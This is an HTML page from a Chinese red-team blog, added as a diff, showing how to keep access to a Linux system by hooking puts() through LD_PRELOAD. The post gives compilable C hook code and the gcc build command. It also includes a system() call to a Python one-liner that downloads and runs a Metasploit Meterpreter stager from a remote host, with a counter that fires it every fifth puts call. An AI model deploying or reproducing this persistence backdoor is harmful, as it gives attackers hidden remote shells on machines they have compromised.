@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Linux权限维持之LD_PRELOAD « 倾旋的博客</title>
+  <meta name="description" content="LD_PRELOADLinux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件/etc/ld.so.preload，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2020-01-01/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Linux权限维持之LD_PRELOAD</h1>
+    <p class="post-meta">Jan 1, 2020</p>
+  </header>
+
+  <article class="post-content">
+    <h2 id="ld_preload">LD_PRELOAD</h2>
+
+<p>Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件<code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和<code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>配置文件中指定的动态链接库依然会被装载,因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。</p>
+
+<p>通过LD_PRELOAD环境变量，能够轻易的加载一个动态链接库。通过这个动态库劫持系统API函数，每次调用都会执行植入的代码。</p>
+
+<h2 id="dlsym">dlsym</h2>
+
+<p><strong>dlsym是一个计算机函数，功能是根据动态链接库操作句柄与符号，返回符号对应的地址，不但可以获取函数地址，也可以获取变量地址。</strong></p>
+
+<p>dlsym定义在Linux操作系统中的dlfcn.h中，函数原型如下：</p>
+
+<blockquote>
+  <p>void * dlsym(void * handle,const char * symbol)</p>
+</blockquote>
+
+<ul>
+  <li>handle：由dlopen打开动态链接库后返回的指针；</li>
+  <li>symbol：要求获取的函数或全局变量的名称。</li>
+</ul>
+
+<p>返回值：void * 指向函数的地址，供调用使用。</p>
+
+<p>劫持示例代码：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">puts</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">new_puts</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
+  <span class="n">new_puts</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"puts"</span><span class="p">);</span>
+<span class="c1">// do some thing …</span>
+<span class="c1">// 这里是puts调用之前</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">new_puts</span><span class="p">(</span><span class="n">message</span><span class="p">);</span>
+  <span class="c1">// 这里是puts调用之后</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>编译命令：</p>
+
+<p><code class="language-plaintext highlighter-rouge">gcc hook.c -o hook.so -fPIC -shared -ldl -D_GNU_SOURCE</code></p>
+
+<ul>
+  <li>-fPIC 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position-Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。</li>
+  <li>-shared 生成共享库格式</li>
+  <li>-ldl 显示方式加载动态库，可能会调用dlopen、dlsym、dlclose、dlerror</li>
+  <li>-D_GNU_SOURCE 以GNU规范标准编译</li>
+</ul>
+
+<p>编写好劫持puts函数的代码后，需要先生成一个Metasploit木马，使得在系统调用puts函数之前，都执行一次木马。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a981d7261f39ee47c93b0e42a8a68a39.png" alt="2020-01-03-13-09-24"></p>
+
+<p><code class="language-plaintext highlighter-rouge">exploit/multi/script/web_delivery</code> 模块能够直接生成一条Python命令，这能够非常方便的获得Meterpreter。
+接下来，将劫持puts函数的代码做一些小改动，在执行puts之前，调用系统函数system来运行python命令，这样每次调用puts都可以获得Meterpreter会话。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/453478b8e6f0c711e8e33e92ff55600e.png" alt="2020-01-03-13-09-40"></p>
+
+<p>正常执行的过程：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/00ff5dc344eedf05cecd3480d2396db1.png" alt="2020-01-03-13-09-51"></p>
+
+<p>执行whoami后，由于底层会调用puts函数，因此也会执行python命令，Metasploit不出意外的获得了Meterpreter：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ad5b8eaa7081113775743b6929919ee4.png" alt="2020-01-03-13-10-01"></p>
+
+<p>接着，为了防止在短时间内获得多个重复的会话，因此需要优化一下代码，例如以某个文件行数和调用puts函数的次数进行取余，就能够达到执行多少次puts函数获得一次Meterpreter。
+优化代码如下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="cp">#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/stat.h&gt;
+#define BUFFER_SIZE 100
+#define COMMAND_NUM 5
+</span><span class="kt">int</span> <span class="nf">check_file_line</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">filename</span><span class="p">){</span>
+	<span class="kt">int</span> <span class="n">file_line</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
+	<span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="o">==</span><span class="nb">NULL</span><span class="p">){</span>
+		<span class="k">return</span> <span class="n">file_line</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">BUFFER_SIZE</span><span class="p">,</span><span class="n">fp</span><span class="p">)</span><span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
+		<span class="n">file_line</span> <span class="o">++</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">file_line</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">add_file_line</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">filename</span><span class="p">){</span>
+	<span class="kt">FILE</span> <span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s">"a+"</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">){</span>
+		<span class="k">return</span><span class="p">;</span>
+	<span class="p">}</span>
+	
+	<span class="n">fputs</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">fp</span><span class="p">);</span>
+	<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">call_system</span><span class="p">(){</span>
+
+  <span class="n">system</span><span class="p">(</span><span class="s">"python -c </span><span class="se">\"</span><span class="s">import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://192.168.170.138:8080/o1ZJy3Wue');exec(r.read());</span><span class="se">\"</span><span class="s">"</span><span class="p">);</span>
+
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">puts</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span> <span class="n">filename</span> <span class="o">=</span> <span class="s">"/tmp/err.log"</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">new_puts</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">file_lines</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">new_puts</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"puts"</span><span class="p">);</span>
+  <span class="n">add_file_line</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+  <span class="n">file_lines</span> <span class="o">=</span> <span class="n">check_file_line</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[+]file_line : %d, NUM = %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">file_lines</span><span class="p">,</span> <span class="n">COMMAND_NUM</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">file_lines</span> <span class="o">%</span> <span class="n">COMMAND_NUM</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+  	<span class="n">call_system</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">new_puts</span><span class="p">(</span><span class="n">message</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6923c9d63c7a4b9563bd298f01df9c98.png" alt="2020-01-03-13-10-13"></p>
+
+<p>在执行至第零次、五次时，成功返回了会话：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7462655c88874bbc909aa75c7cb940f2.png" alt="2020-01-03-13-10-21"></p>
+
+<p>COMMAND_NUM 可自定义</p>
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
